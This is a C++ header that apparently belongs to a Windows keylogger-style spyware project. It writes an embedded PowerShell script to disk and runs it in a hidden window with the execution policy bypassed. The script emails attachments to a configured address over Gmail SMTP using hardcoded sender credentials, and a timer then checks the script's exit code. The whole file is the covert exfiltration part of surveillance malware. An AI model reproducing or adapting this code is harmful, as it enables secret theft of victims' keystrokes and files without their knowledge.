#pragma once

#include<fstream>
#include<vector>
#include<Windows.h>
#include"IO.h"
#include"Timer.h"
#include"Helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail {

	//Reciever's address
	#define X_EM_TO ""

	//Sender's address
	#define	X_EM_FROM ""

	//Password of sender
	#define X_EM_PASS ""

	
	const std::string &PowerShellScript =
		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
		"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		std::string(X_EM_TO) +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		std::string(X_EM_PASS) +
		"\""
		" -From \"" +
		std::string(X_EM_FROM) +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

#undef X_EM_TO
#undef X_EM_FROM
#undef X_EM_PASS


	std::string StringReplace(std::string s, const std::string &what, const std::string &with) {
		if (what.empty())
			return s;

		size_t stringPosition = 0;

		while ((stringPosition = s.find(what, stringPosition)) != std::string::npos) {
			s.replace(stringPosition, what.length(), with);
			stringPosition += with.length();
		}

		return s;
	}

	bool CheckFileExists(const std::string &fileName) {
		std::ifstream file(fileName);
		return (bool)file;
	}

	bool CreateScript() {
		std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

		if (!script)
			return false;

		script << PowerShellScript;
		if (!script)
			return false;

		script.close();

		return true;
	}

	Timer mailTimer;

	int SendMail(const std::string &subject, const std::string &body, const std::string &attachments) {
		bool ok;

		ok = IO::MakeDir(IO::GetOurPath(true));
		if (!ok)
			return -1;
		std::string scriptPath = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
		if (!CheckFileExists(scriptPath))
			ok = CreateScript();

		if (!ok)
			return -2;

		std::string param = "-ExecutionPolicy ByPass -File \"" + scriptPath + "\" -Subj \""
			+ StringReplace(subject, "\"", "\\\"")
			+ "\" -Body \""
			+ StringReplace(body, "\"", "\\\"")
			+ "\" -Att \"" + attachments + "\"";

		SHELLEXECUTEINFOA ExecInfo = { 0 };
		
		ExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		ExecInfo.hwnd = NULL;
		ExecInfo.lpVerb = "open";
		ExecInfo.lpFile = "powershell";
		ExecInfo.lpParameters = param.c_str();
		ExecInfo.lpDirectory = NULL;
		ExecInfo.nShow = SW_HIDE;
		ExecInfo.hInstApp = NULL;

		ok = (bool)ShellExecuteExA(&ExecInfo);

		if (!ok)
			return -3;

		WaitForSingleObject(ExecInfo.hProcess, 7000);
		DWORD exitCode = 100;

		GetExitCodeProcess(ExecInfo.hProcess, &exitCode);

		mailTimer.SetFunction([&]() {
			WaitForSingleObject(ExecInfo.hProcess, 60000);
			GetExitCodeProcess(ExecInfo.hProcess, &exitCode);
			if ((int)exitCode == STILL_ACTIVE) {
				TerminateProcess(ExecInfo.hProcess, 100);
			}
			HelperFunc::WriteAppLog("<From SendMail> Return Code:" + HelperFunc::ToString((int)exitCode));
		});
			
		mailTimer.RepeatCounter(1L);
		mailTimer.SetInterval(10L);
		mailTimer.Start(true);
		return (int)exitCode;
	}


	int SendMail(const std::string &subject, const std::string &body,
		const std::vector<std::string> &vecAttachments) {
		std::string attachments = "";
		if (vecAttachments.size() == 1)
			attachments = vecAttachments.at(0);
		else {
			for (const auto &v : vecAttachments)
				attachments += v + "::";
			attachments = attachments.substr(0, attachments.length() - 2);

		}

		return SendMail(subject, body, attachments);
	}
}